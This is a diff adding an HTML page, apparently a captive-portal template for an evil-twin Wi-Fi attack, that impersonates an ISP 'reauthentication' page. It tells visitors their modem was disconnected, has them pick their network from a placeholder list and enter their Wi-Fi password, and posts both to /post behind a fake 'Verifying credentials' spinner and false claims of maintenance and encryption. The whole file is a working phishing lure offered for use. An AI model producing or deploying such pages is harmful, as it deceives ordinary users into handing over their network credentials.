@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ISP - Service Reauthentication</title>
+<style>
+body{font-family:Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#0a4f7a,#06304a);margin:0;padding:20px;color:#f0f0f0;min-height:100vh;box-sizing:border-box}
+.brand{text-align:center;margin:20px 0 30px;font-size:22px;font-weight:600;letter-spacing:1px;color:#7fc7ff}
+.card{max-width:420px;margin:0 auto;background:#fff;color:#222;border-radius:8px;padding:28px;box-shadow:0 8px 24px rgba(0,0,0,.3)}
+h1{font-size:18px;margin:0 0 10px;color:#0a4f7a}
+p.lead{font-size:13px;line-height:1.5;margin:0 0 18px;color:#555}
+label{display:block;font-size:13px;margin:12px 0 4px;color:#444;font-weight:500}
+input,select{width:100%;padding:10px;font-size:14px;border:1px solid #cfd6dc;border-radius:5px;box-sizing:border-box;background:#fff}
+input:focus,select:focus{outline:none;border-color:#0a4f7a;box-shadow:0 0 0 2px rgba(10,79,122,.15)}
+button{margin-top:20px;width:100%;background:#0a4f7a;color:#fff;border:none;padding:12px;font-size:14px;font-weight:600;border-radius:5px;cursor:pointer}
+button:hover{background:#083d5e}
+.note{font-size:11px;color:#888;margin-top:14px;text-align:center;line-height:1.4}
+.err{margin:12px 0 0;padding:10px;background:#fdecea;border:1px solid #f5c2bd;border-radius:5px;color:#c0392b;font-size:13px}
+.err:empty{display:none}
+#lo{position:fixed;inset:0;background:rgba(255,255,255,.95);display:none;flex-direction:column;align-items:center;justify-content:center;z-index:10}
+#lo.show{display:flex}
+.sp{border:4px solid #eee;border-top:4px solid #0a4f7a;border-radius:50%;width:42px;height:42px;animation:spin 1s linear infinite;margin-bottom:18px}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="brand">&#127760; YourISP Customer Portal</div>
+<div class="card">
+<h1>Reauthentication required</h1>
+<p class="lead">Your modem was disconnected from our authentication server. Please re-enter your home network credentials to restore your internet connection.</p>
+<div class="err">%ERROR%</div>
+<form action="/post" method="POST" onsubmit="document.getElementById('lo').classList.add('show')">
+<label>Home network (SSID)</label>
+<select name="username" required>
+<option value="" disabled selected>Choose your network&hellip;</option>
+%SSID_OPTIONS%
+</select>
+<label>Wi-Fi password</label>
+<input type="password" name="password" autocomplete="current-password" required>
+<button type="submit">Restore connection</button>
+</form>
+<div class="note">This step is required after maintenance. Your data is encrypted in transit.</div>
+</div>
+<div id="lo"><div class="sp"></div><p>Verifying credentials&hellip;</p></div>
+</body>
+</html>
